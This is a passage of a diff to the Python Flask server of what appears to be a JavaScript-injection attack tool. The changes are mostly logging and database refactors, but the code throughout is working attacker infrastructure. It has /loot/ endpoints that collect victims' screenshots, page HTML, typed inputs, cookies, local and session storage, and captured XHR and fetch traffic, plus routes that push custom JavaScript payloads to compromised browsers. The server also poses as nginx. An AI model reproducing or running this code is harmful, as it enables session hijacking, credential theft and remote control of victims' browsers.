         # Shenanigans from the 'client' are afoot
-        print("!!!! Wrong screenshot filetype!")
-        print("---- Type: " + file_type)
+        logger.error("!!!! Wrong screenshot filetype!")
+        logger.error("---- Type: " + file_type)
         return "No.", 401
 
-    if identifier in SessionImages.keys():
-        imageNumber = SessionImages[identifier]
-        #print("Using image number: " + str(imageNumber))
-        SessionImages[identifier] = imageNumber + 1
-    else:
-        raise RuntimeError("Session image counter not found")
-        quit()
 
-    #print("Writing the file to disk...")
+    client = Client.query.with_entities(Client.imageCounter).filter_by(uuid=identifier).first()
+
+    imageNumber = client[0]
+
+
+    #logger.info("Writing the file to disk...")
     with open (dataDirectory + "lootFiles/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png", "wb") as binary_file:
         binary_file.write(image)
         binary_file.close()
 
     # Put it in the DB
     newScreenshot = Screenshot(clientID=identifier, fileName="./lootFiles/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png")
-    db.session.add(newScreenshot)
+    db_session.add(newScreenshot)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
@@ -914,13 +1120,14 @@ def recordScreenshot(identifier):
         ip = request.remote_addr
 
     clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    db_session.execute(update(Client).where(Client.uuid == identifier).values(imageCounter=Client.imageCounter+1))
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newScreenshot)
+    db_session.refresh(newScreenshot)
     newEvent = Event(clientID=identifier, timeStamp=newScreenshot.timeStamp, 
     eventType='SCREENSHOT', eventID=newScreenshot.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()
 
 
@@ -932,7 +1139,7 @@ def recordScreenshot(identifier):
 # Capture the HTML seen
 @app.route('/loot/html/<identifier>', methods=['POST'])
 def recordHTML(identifier):
-    # print("Got HTML from: " + identifier)
+    # logger.info("Got HTML from: " + identifier)
 
     if not isClientSessionValid(identifier):
         return "No.", 401
@@ -942,13 +1149,9 @@ def recordHTML(identifier):
     url = content['url']
     trapHTML = content['html']
 
+    client = Client.query.with_entities(Client.htmlCodeCounter).filter_by(uuid=identifier).first()
 
-    if identifier in SessionHTML.keys():
-        htmlNumber = SessionHTML[identifier]
-        SessionHTML[identifier] = htmlNumber + 1
-    else:
-        raise RuntimeError("Session HTML counter not found")
-        quit()
+    htmlNumber = client[0]
 
     lootFile = dataDirectory + "lootFiles/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html"
 
@@ -959,7 +1162,7 @@ def recordHTML(identifier):
 
     # Put it in the DB
     newHtml = HtmlCode(clientID=identifier, url=content['url'],fileName = lootFile)
-    db.session.add(newHtml)
+    db_session.add(newHtml)
 
 
     if (proxyMode):
@@ -969,13 +1172,14 @@ def recordHTML(identifier):
 
 
     clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    db_session.execute(update(Client).where(Client.uuid == identifier).values(htmlCodeCounter=Client.htmlCodeCounter+1))
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newHtml)
+    db_session.refresh(newHtml)
     newEvent = Event(clientID=identifier, timeStamp=newHtml.timeStamp, 
         eventType='HTML', eventID=newHtml.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()
 
 
@@ -987,18 +1191,18 @@ def recordHTML(identifier):
 # Record new URL visited in trap
 @app.route('/loot/location/<identifier>', methods=['POST'])
 def recordUrl(identifier):
-    # print("New URL recorded from: " + identifier)
+    # logger.info("New URL recorded from: " + identifier)
     if not isClientSessionValid(identifier):
         return "No.", 401
 
     lootDir = findLootDirectory(identifier)
     content = request.json
     url = content['url']
-    # print("Got URL: " + url)
+    # logger.info("Got URL: " + url)
 
     # Put it in the DB
     newUrl = UrlVisited(clientID=identifier, url=content['url'])
-    db.session.add(newUrl)
+    db_session.add(newUrl)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
@@ -1009,10 +1213,10 @@ def recordUrl(identifier):
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newUrl)
+    db_session.refresh(newUrl)
     newEvent = Event(clientID=identifier, timeStamp=newUrl.timeStamp, 
     eventType='URLVISITED', eventID=newUrl.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()
 
     return "ok", 200
@@ -1023,7 +1227,7 @@ def recordUrl(identifier):
 # Record user inputs
 @app.route('/loot/input/<identifier>', methods=['POST'])
 def recordInput(identifier):
-    # print("New input recorded from: " + identifier)
+    # logger.info("New input recorded from: " + identifier)
     if not isClientSessionValid(identifier):
         return "No.", 401
 
@@ -1031,12 +1235,12 @@ def recordInput(identifier):
     content = request.json
     inputName = content['inputName']
     inputValue = content['inputValue']
-    # print("Got input: " + inputName + ", value: " + inputValue)
+    # logger.info("Got input: " + inputName + ", value: " + inputValue)
 
 
     # Put it in the DB
     newInput = UserInput(clientID=identifier, inputName=content['inputName'], inputValue=content['inputValue'])
-    db.session.add(newInput)
+    db_session.add(newInput)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
@@ -1047,10 +1251,10 @@ def recordInput(identifier):
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newInput)
+    db_session.refresh(newInput)
     newEvent = Event(clientID=identifier, timeStamp=newInput.timeStamp, 
     eventType='USERINPUT', eventID=newInput.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
@@ -1062,7 +1266,7 @@ def recordInput(identifier):
 # which would probably include any session cookies. Probably. 
 @app.route('/loot/dessert/<identifier>', methods=['POST'])
 def recordCookie(identifier):
-    # print("New cookie recorded from: " + identifier)
+    # logger.info("New cookie recorded from: " + identifier)
     if not isClientSessionValid(identifier):
         return "No.", 401
 
@@ -1070,12 +1274,12 @@ def recordCookie(identifier):
     content = request.json
     cookieName = content['cookieName']
     cookieValue = content['cookieValue']
-    # print("Cookie name: " + content['cookieName'] + ", value: " + content['cookieValue'])
+    # logger.info("Cookie name: " + content['cookieName'] + ", value: " + content['cookieValue'])
 
 
     # Put it in the DB
     newCookie = Cookie(clientID=identifier, cookieName=cookieName, cookieValue=cookieValue)
-    db.session.add(newCookie)
+    db_session.add(newCookie)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
@@ -1086,10 +1290,10 @@ def recordCookie(identifier):
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newCookie)
+    db_session.refresh(newCookie)
     newEvent = Event(clientID=identifier, timeStamp=newCookie.timeStamp, 
     eventType='COOKIE', eventID=newCookie.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
@@ -1099,7 +1303,7 @@ def recordCookie(identifier):
 # Record local storage data bits
 @app.route('/loot/localstore/<identifier>', methods=['POST'])
 def recordLocalStorageEntry(identifier):
-    # print("New localStorage data recorded from: " + identifier)
+    # logger.info("New localStorage data recorded from: " + identifier)
     if not isClientSessionValid(identifier):
         return "No.", 401
 
@@ -1112,7 +1316,7 @@ def recordLocalStorageEntry(identifier):
 
     # Put it in the DB
     newLocalStorage = LocalStorage(clientID=identifier, key=localStorageKey, value=localStorageValue)
-    db.session.add(newLocalStorage)
+    db_session.add(newLocalStorage)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
@@ -1123,10 +1327,10 @@ def recordLocalStorageEntry(identifier):
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newLocalStorage)
+    db_session.refresh(newLocalStorage)
     newEvent = Event(clientID=identifier, timeStamp=newLocalStorage.timeStamp, 
     eventType='LOCALSTORAGE', eventID=newLocalStorage.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
@@ -1136,7 +1340,7 @@ def recordLocalStorageEntry(identifier):
 # Record session storage data bits
 @app.route('/loot/sessionstore/<identifier>', methods=['POST'])
 def recordSessionStorageEntry(identifier):
-    # print("New sessionStorage data recorded from: " + identifier)
+    # logger.info("New sessionStorage data recorded from: " + identifier)
     if not isClientSessionValid(identifier):
         return "No.", 401
  
@@ -1147,7 +1351,7 @@ def recordSessionStorageEntry(identifier):
 
     # Put it in the DB
     newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
-    db.session.add(newSessionStorage)
+    db_session.add(newSessionStorage)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
@@ -1159,10 +1363,10 @@ def recordSessionStorageEntry(identifier):
 
 
     # add to global event table
-    db.session.refresh(newSessionStorage)
+    db_session.refresh(newSessionStorage)
     newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
     eventType ='SESSIONSTORAGE', eventID=newSessionStorage.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
@@ -1176,14 +1380,14 @@ def recordXhrOpen(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    # print("## Recording XHR open event")
+    # logger.info("## Recording XHR open event")
     content = request.json 
     method  = content['method']
     url     = content['url']
 
     # Put it in the database
     newXhrOpen = XhrOpen(clientID=identifier, method=method, url=url)
-    db.session.add(newXhrOpen)
+    db_session.add(newXhrOpen)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
@@ -1194,10 +1398,10 @@ def recordXhrOpen(identifier):
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newXhrOpen)
+    db_session.refresh(newXhrOpen)
     newEvent = Event(clientID=identifier, timeStamp=newXhrOpen.timeStamp, 
     eventType='XHROPEN', eventID=newXhrOpen.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
@@ -1210,14 +1414,14 @@ def recordXhrHeader(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    # print("## Recording XHR Header event")
+    # logger.info("## Recording XHR Header event")
     content = request.json 
     header  = content['header']
     value   = content['value']
 
     # Put it in the database
     newXhrHeader = XhrSetHeader(clientID=identifier, header=header, value=value)
-    db.session.add(newXhrHeader)
+    db_session.add(newXhrHeader)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
@@ -1228,10 +1432,10 @@ def recordXhrHeader(identifier):
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newXhrHeader)
+    db_session.refresh(newXhrHeader)
     newEvent  = Event(clientID=identifier, timeStamp=newXhrHeader.timeStamp, 
     eventType ='XHRSETHEADER', eventID=newXhrHeader.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
@@ -1244,14 +1448,14 @@ def recordXhrCall(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    # print("## Recording XHR api call")
+    # logger.info("## Recording XHR api call")
     content      = request.json 
     requestBody  = content['requestBody']
     responseBody = content['responseBody']
 
     # Put it in the database
     newXhrCall = XhrCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
-    db.session.add(newXhrCall)
+    db_session.add(newXhrCall)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
@@ -1262,10 +1466,10 @@ def recordXhrCall(identifier):
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newXhrCall)
+    db_session.refresh(newXhrCall)
     newEvent  = Event(clientID=identifier, timeStamp=newXhrCall.timeStamp, 
     eventType ='XHRCALL', eventID=newXhrCall.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
@@ -1278,14 +1482,14 @@ def recordFetchSetup(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    # print("## Recording Fetch setup event")
+    # logger.info("## Recording Fetch setup event")
     content = request.json 
     method  = content['method']
     url     = content['url']
 
     # Put it in the database
     newFetchSetup = FetchSetup(clientID=identifier, method=method, url=url)
-    db.session.add(newFetchSetup)
+    db_session.add(newFetchSetup)
 
 
     if (proxyMode):
@@ -1297,10 +1501,10 @@ def recordFetchSetup(identifier):
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newFetchSetup)
+    db_session.refresh(newFetchSetup)
     newEvent  = Event(clientID=identifier, timeStamp=newFetchSetup.timeStamp, 
     eventType ='FETCHSETUP', eventID=newFetchSetup.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
@@ -1313,14 +1517,14 @@ def recordFetchHeader(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    # print("## Recording Fetch Header event")
+    # logger.info("## Recording Fetch Header event")
     content = request.json 
     header  = content['header']
     value   = content['value']
 
     # Put it in the database
     newFetchHeader = FetchHeader(clientID=identifier, header=header, value=value)
-    db.session.add(newFetchHeader)
+    db_session.add(newFetchHeader)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
@@ -1331,10 +1535,10 @@ def recordFetchHeader(identifier):
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newFetchHeader)
+    db_session.refresh(newFetchHeader)
     newEvent  = Event(clientID=identifier, timeStamp=newFetchHeader.timeStamp, 
     eventType ='FETCHHEADER', eventID=newFetchHeader.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
@@ -1346,14 +1550,14 @@ def recordFetchCall(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    # print("## Recording Fetch api call")
+    # logger.info("## Recording Fetch api call")
     content      = request.json 
     requestBody  = content['requestBody']
     responseBody = content['responseBody']
 
     # Put it in the database
     newFetchCall = FetchCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
-    db.session.add(newFetchCall)
+    db_session.add(newFetchCall)
 
 
     if (proxyMode):
@@ -1365,10 +1569,10 @@ def recordFetchCall(identifier):
     dbCommit()
 
     # add to global event table
-    db.session.refresh(newFetchCall)
+    db_session.refresh(newFetchCall)
     newEvent  = Event(clientID=identifier, timeStamp=newFetchCall.timeStamp, 
     eventType ='FETCHCALL', eventID=newFetchCall.id)
-    db.session.add(newEvent)
+    db_session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
@@ -1396,7 +1600,7 @@ def getClients():
 @app.route('/api/clientEvents/<id>', methods=['GET'])
 @login_required
 def getClientEvents(id):
-    print("Retrieving events table for client: " + id)
+    # logger.info("Retrieving events table for client: " + id)
     client = Client.query.filter_by(id=id).first()
     clientUUID = client.uuid;
 
@@ -1465,7 +1669,7 @@ def getClientUserInputs(key):
 @app.route('/api/clientCookie/<key>', methods=['GET'])
 @login_required
 def getClientCookies(key):
-    # print("*** In cookie lookup, key is: " + key)
+    # logger.info("*** In cookie lookup, key is: " + key)
     cookie = Cookie.query.filter_by(id=key).first()
 
     cookieData = {'cookieName':escape(cookie.cookieName), 'cookieValue':escape(cookie.cookieValue)}
@@ -1480,9 +1684,9 @@ def getClientCookies(key):
 @app.route('/api/clientLocalStorage/<key>', methods=['GET'])
 @login_required
 def getClientLocalStorage(key):
-    # print("**** Fetching client local storage...")
+    # logger.info("**** Fetching client local storage...")
     localStorage = LocalStorage.query.filter_by(id=key).first()
-    # print("Sending back: " + localStorage.key + ":" + localStorage.value)
+    # logger.info("Sending back: " + localStorage.key + ":" + localStorage.value)
     
     localStorageData = {'localStorageKey':escape(localStorage.key), 'localStorageValue':escape(localStorage.value)}
     
@@ -1506,7 +1710,7 @@ def getClientSesssionStorage(key):
 @app.route('/api/clientXhrOpen/<key>', methods=['GET'])
 @login_required
 def getClientXhrOpen(key):
-    # print("**** Fetching client xhr api open call...")
+    # logger.info("**** Fetching client xhr api open call...")
     xhrOpen = XhrOpen.query.filter_by(id=key).first()
 
     xhrOpenData = {'method':escape(xhrOpen.method), 'url':escape(xhrOpen.url)}
@@ -1517,7 +1721,7 @@ def getClientXhrOpen(key):
 @app.route('/api/clientXhrSetHeader/<key>', methods=['GET'])
 @login_required
 def getClientXhrSetHeader(key):
-    # print("**** Fetching client xhr api set header call...")
+    # logger.info("**** Fetching client xhr api set header call...")
     xhrSetHeader = XhrSetHeader.query.filter_by(id=key).first()
 
     xhrHeaderData = {'header':escape(xhrSetHeader.header), 'value':escape(xhrSetHeader.value)}
@@ -1529,7 +1733,7 @@ def getClientXhrSetHeader(key):
 @app.route('/api/clientXhrCall/<key>', methods=['GET'])
 @login_required
 def getClientXhrCall(key):
-    # print("**** Fetching client xhr api call...")
+    # logger.info("**** Fetching client xhr api call...")
     xhrCall = XhrCall.query.filter_by(id=key).first()
 
     xhrCallData = {'requestBody':xhrCall.requestBody, 'responseBody':xhrCall.responseBody}
@@ -1541,7 +1745,7 @@ def getClientXhrCall(key):
 @app.route('/api/clientFetchSetup/<key>', methods=['GET'])
 @login_required
 def getClientFetchSetup(key):
-    # print("**** Fetching client fetch setup call...")
+    # logger.info("**** Fetching client fetch setup call...")
     fetchSetup = FetchSetup.query.filter_by(id=key).first()
 
     fetchSetupData = {'method':escape(fetchSetup.method), 'url':escape(fetchSetup.url)}
@@ -1553,7 +1757,7 @@ def getClientFetchSetup(key):
 @app.route('/api/clientFetchHeader/<key>', methods=['GET'])
 @login_required
 def getClientFetchHeader(key):
-    # print("**** Fetching client fetch api header call...")
+    # logger.info("**** Fetching client fetch api header call...")
     fetchHeader = FetchHeader.query.filter_by(id=key).first()
 
     fetchHeaderData = {'header':escape(fetchHeader.header), 'value':escape(fetchHeader.value)}
@@ -1565,7 +1769,7 @@ def getClientFetchHeader(key):
 @app.route('/api/clientFetchCall/<key>', methods=['GET'])
 @login_required
 def getClientFetchCall(key):
-    # print("**** Fetching client xhr api call...")
+    # logger.info("**** Fetching client xhr api call...")
     fetchCall = FetchCall.query.filter_by(id=key).first()
 
     fetchCallData = {'requestBody':fetchCall.requestBody, 'responseBody':fetchCall.responseBody}
@@ -1669,7 +1873,7 @@ def blockIP():
     ip      = content['ip']
 
     blockedIP = BlockedIP(ip=ip)
-    db.session.add(blockedIP)
+    db_session.add(blockedIP)
     dbCommit()
 
     return "ok", 200
@@ -1679,10 +1883,9 @@ def blockIP():
 @app.route('/api/deleteBlockedIP/<key>', methods=['GET'])
 @login_required
 def deleteBlockedIP(key):
-    print("&&& Deleting blocked ip key: " + key)
     blockedIP = BlockedIP.query.filter_by(id=key).first()
 
-    db.session.delete(blockedIP)
+    db_session.delete(blockedIP)
     dbCommit()
 
     return "ok", 200
@@ -1787,7 +1990,7 @@ def runPayloadAllClients(key):
     for client in clients:
         if client.sessionValid:
             newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
-            db.session.add(newJob)
+            db_session.add(newJob)
 
     dbCommit()
 
@@ -1811,7 +2014,7 @@ def repeatPayloadAllClients():
         clientJobs = ClientPayloadJob.query.filter_by(payloadKey=payload.id)
 
         for clientJob in clientJobs:
-            db.session.delete(clientJob)
+            db_session.delete(clientJob)
 
 
     dbCommit()
@@ -1835,7 +2038,7 @@ def repeatPayloadSingleClient():
     if repeatrun:
         # Turn it on
         newJob = ClientPayloadJob(clientKey=clientID, payloadKey=payload.id, code=payload.code, repeatrun=True)
-        db.session.add(newJob)
+        db_session.add(newJob)
     else:
         # Turn it off
         currentClientPayloads = (ClientPayloadJob.query
@@ -1865,12 +2068,12 @@ def runPayloadSingleClient():
     # testing just for the print
     # client = Client.query.filter_by(id=clientKey).first()
 
-    # print("Running single client payload:")
-    # print("Client: " + client.nickname)
-    # print("Code: " + payload.code)
+    # logger.info("Running single client payload:")
+    # logger.info("Client: " + client.nickname)
+    # logger.info("Code: " + payload.code)
 
     newJob = ClientPayloadJob(clientKey=clientKey, payloadKey=payloadKey, code=payload.code)
-    db.session.add(newJob)
+    db_session.add(newJob)
     dbCommit()
 
     return "ok", 200
@@ -1880,8 +2083,8 @@ def runPayloadSingleClient():
 @app.route('/api/clearAllPayloadJobs', methods=['GET'])
 @login_required
 def clearAllPayloadJobs():
-    # print("Clearing all client payload jobs...")
-    db.session.query(ClientPayloadJob).delete()
+    # logger.info("Clearing all client payload jobs...")
+    db_session.query(ClientPayloadJob).delete()
 
     CustomPayloads = CustomPayload.query.filter_by(autorun=True)
 
@@ -1916,7 +2119,7 @@ def saveCustomPayload():
         payload.code        = newCode
     else:
         newPayload = CustomPayload(name=name, description=newDescription, code=newCode)
-        db.session.add(newPayload)
+        db_session.add(newPayload)
 
     dbCommit()
 
@@ -1942,7 +2145,7 @@ def saveCustomPayloads():
             payload.code        = newCode
         else:
             newPayload = CustomPayload(name=name, description=newDescription, code=newCode)
-            db.session.add(newPayload)
+            db_session.add(newPayload)
 
     dbCommit()
 
@@ -1955,7 +2158,7 @@ def saveCustomPayloads():
 @login_required
 def deleteCustomPayload(key):
     payload = CustomPayload.query.filter_by(id=key).first()
-    db.session.delete(payload)
+    db_session.delete(payload)
     dbCommit()
 
     return "ok", 200
@@ -1965,110 +2168,14 @@ def deleteCustomPayload(key):
 
 
 if __name__ == '__main__':
-    printHeader()
+    # printHeader()
 
-    # Initilize our locks
-    threadLock   = threading.Lock()
-    databaseLock = threading.Lock()
-
-
-    # Check for existing database file
-    if database_exists('sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')):
-        with app.app_context():
-            print("!! SQLite database already exists:")
-            clients = Client.query.all()
-            numClients = len(clients)
-
-            users = User.query.all()
-            numUsers = len(users)
-
-            print("Existing database has " + str(numClients) + " clients and " 
-                + str(numUsers) + " users.")
-
-            if numUsers != 0:
-                print("Make selection on how to handle existing users:")
-                print("1 - Keep existing users")
-                print("2 - Delete all users and generate new admin account")
-
-                val = int(input("\nSelection: "))
-                if val == 2:
-                    print("Generating new admin account")
-                    User.__table__.drop(db.engine)
-                    dbCommit()
-
-                    db.create_all()
-
-                    addAdminUser()
-                elif val == 1:
-                    print("Keeping existing users.")
-                else:
-                    print("Invalid selection.")
-                    exit()
-
-
-            if numClients != 0:
-                print("Make selection on how to handle existing clients:")
-                print("1 - Keep existing client data")
-                print("2 - Delete all client data and start fresh")
-
-
-                val = int(input("\nSelection: "))
-                if val == 2:
-                    print("Clearing client data")
-                    Client.__table__.drop(db.engine)
-                    Screenshot.__table__.drop(db.engine)
-                    HtmlCode.__table__.drop(db.engine)
-                    UrlVisited.__table__.drop(db.engine)
-                    UserInput.__table__.drop(db.engine)
-                    Cookie.__table__.drop(db.engine)
-                    LocalStorage.__table__.drop(db.engine)
-                    SessionStorage.__table__.drop(db.engine)
-                    XhrOpen.__table__.drop(db.engine)
-                    XhrSetHeader.__table__.drop(db.engine)
-                    XhrCall.__table__.drop(db.engine)
-                    FetchSetup.__table__.drop(db.engine)
-                    FetchHeader.__table__.drop(db.engine)
-                    FetchCall.__table__.drop(db.engine)
-                    Event.__table__.drop(db.engine)
-                    ClientPayloadJob.__table__.drop(db.engine)
-                    dbCommit()
-
-                    db.create_all()
-                    if os.path.exists(dataDirectory + "lootFiles"):
-                        shutil.rmtree(dataDirectory + "lootFiles")
-
-                elif val == 1:
-                    print("Keeping existing client data.")
-                else:
-                    print("Invalid selection.")
-                    exit()
-
-
-    else:
-        print("No database found")
-        print("... creating database...")
-        with app.app_context():
-            db.drop_all()
-            db.create_all()
-            if os.path.exists(dataDirectory + "lootFiles"):
-                shutil.rmtree(dataDirectory + "lootFiles")
-            addAdminUser()
-            initApplicationDefaults()
-
-
-    with app.app_context():
-        db.session.configure(autoflush=False)
-
-
-    # Check for loot directory
-    if not os.path.exists(dataDirectory + "lootFiles"):
-        os.mkdir(dataDirectory + "lootFiles")
+    logger.info("Python main running....")
 
     # Response configuration
     WSGIRequestHandler.protocol_version = "HTTP/1.1"
     WSGIRequestHandler.server_version   = "nginx"
     WSGIRequestHandler.sys_version      = ""
-
 
     # If proxy mode we run HTTP and accept the proxy headers from nginx
     # If not proxy mode we'll run self-signed cert for testing
